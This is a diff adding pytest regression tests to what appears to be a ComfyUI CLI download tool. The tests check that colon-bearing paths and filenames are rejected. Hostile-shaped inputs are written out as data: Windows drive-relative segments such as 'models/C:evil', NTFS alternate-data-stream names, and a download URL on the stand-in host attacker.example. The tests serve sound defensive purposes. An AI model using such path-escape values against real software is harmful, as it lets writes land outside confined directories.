@@ -17,7 +17,7 @@ from __future__ import annotations
 
 import asyncio
 import time
-from pathlib import PurePosixPath
+from pathlib import PurePosixPath, PureWindowsPath
 
 import pytest
 from conftest import NO_SUCH_OPTION_STDERR, envelope
@@ -261,6 +261,65 @@ def test_download_model_rejects_windows_drive_relative_path(bad_path, patched_ru
 
     with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
         _download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+# --- A colon ANYWHERE, not just a leading drive ------------------------------
+#
+# `ntpath.splitdrive` only ever reads a LEADING drive, so it sees nothing in
+# `models/C:evil` — every colon case pinned above (`C:evil`, `C:/Windows`,
+# `C:\Windows`) happens to carry that leading drive, and would still be refused
+# with the `":" in relative_path` term deleted. These are the shapes that term
+# alone catches, so it cannot be dropped as redundant with the drive check.
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "models/C:evil",  # drive-relative in a LATER segment: splitdrive is blind
+        "models/loras:ads",  # NTFS alternate-data-stream syntax (`name:stream`)
+        "models/x:y",
+        "models/evil:",  # trailing colon — still an ADS name on NTFS
+    ],
+)
+def test_download_model_rejects_mid_path_colon_relative_path(bad_path, patched_run):
+    """A colon in a NON-leading segment is refused before any child spawns.
+
+    Regression pin for the `":" in relative_path` term specifically:
+    `ntpath.splitdrive` reads only a leading drive, so it reports no drive for
+    any value here and these shapes are refused by that term ALONE. Without this
+    test the whole suite stays green with the term deleted as "redundant with
+    splitdrive", and `models/C:evil` / `models/loras:ads` start being accepted.
+    The colon term lives in the FIRST raise, so the diagnosis is traversal.
+    """
+    calls = patched_run(envelope(data=_submit()))
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*traversal"):
+        _download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+def test_download_model_rejects_mid_path_colon_resetting_the_anchor(patched_run):
+    """Named regression pin for what the mid-path colon rejection prevents.
+
+    A drive-carrying component joined on Windows does not extend the path — it
+    RESETS the anchor to that drive's own working directory, discarding the
+    workspace entirely. `<workspace>/models/C:evil` is not a folder under the
+    models dir; it is whatever `C:evil` resolves to on drive C:, outside the
+    workspace the guard claims to confine the write to.
+    """
+    calls = patched_run(envelope(data=_submit()))
+
+    # Pin the mechanism, so this test fails loudly if pathlib ever changes: the
+    # workspace anchor is discarded by the drive-carrying component.
+    assert PureWindowsPath("D:/ws") / "C:evil" == PureWindowsPath("C:evil")
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*traversal"):
+        _download_model(
+            "https://attacker.example/payload", relative_path="models/C:evil"
+        )
 
     assert calls == []
 
@@ -541,6 +600,24 @@ def test_download_model_rejects_pathy_filename(bad_name, patched_run):
 def test_download_model_rejects_windows_drive_relative_filename(bad_name, patched_run):
     """A Windows drive/UNC/root-relative ``filename`` is refused before any child
     spawns — on Linux CI as much as on Windows."""
+    calls = patched_run(envelope(data=_submit()))
+
+    with pytest.raises(server.ComfyCliError, match="invalid filename"):
+        _download_model("https://hf.co/x.safetensors", filename=bad_name)
+
+    assert calls == []
+
+
+@pytest.mark.parametrize("bad_name", ["evil:ads", "model:stream.safetensors"])
+def test_download_model_rejects_non_drive_colon_filename(bad_name, patched_run):
+    """The bare-name colon check reaches past a drive prefix.
+
+    The drive shapes (`C:evil.dll`, `C:evil.exe`) are pinned above, but every one
+    of them is also what `ntpath.splitdrive` would report — so they leave the
+    colon term free to be narrowed to a drive check. These are `name:stream`
+    NTFS alternate-data-stream values with no drive at all: refused by the `":"
+    in filename` term alone.
+    """
     calls = patched_run(envelope(data=_submit()))
 
     with pytest.raises(server.ComfyCliError, match="invalid filename"):
